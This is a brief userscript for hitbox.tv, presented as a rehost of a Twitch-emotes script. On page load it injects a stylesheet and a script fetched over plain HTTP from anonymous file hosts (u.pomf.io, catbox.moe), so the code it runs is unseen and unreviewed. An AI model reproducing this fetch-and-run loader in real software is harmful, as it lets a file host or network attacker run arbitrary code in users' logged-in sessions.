// ==UserScript==
// @name        HitboxTV Twitch Emotes Another Host
// @description rehost of https://greasyfork.org/en/scripts/3960-hitboxtv-twitch-emotes
// @include     http://www.hitbox.tv/*
// @include     http://hitbox.tv/*
// @version     0.4.83 fuckit
// @namespace https://twitter.com/BitOBytes
// @grant       none
// @downloadURL https://update.greasyfork.org/scripts/13950/HitboxTV%20Twitch%20Emotes%20Another%20Host.user.js
// @updateURL https://update.greasyfork.org/scripts/13950/HitboxTV%20Twitch%20Emotes%20Another%20Host.meta.js
// ==/UserScript==
window.onload = function ()
{
var style = document.createElement('link');
style.setAttribute('rel', 'stylesheet');
style.setAttribute('type', 'text/css');
style.setAttribute('href', 'http://files.catbox.moe/599054.css');

var script =document.createElement('script');
script.setAttribute('type', 'text/javascript');
script.setAttribute('src', 'http://u.pomf.io/xvvdun.txt');

var body = document.getElementsByTagName('body')[0];
if (body) {
    body.appendChild(script);
    body.appendChild(style);
}
}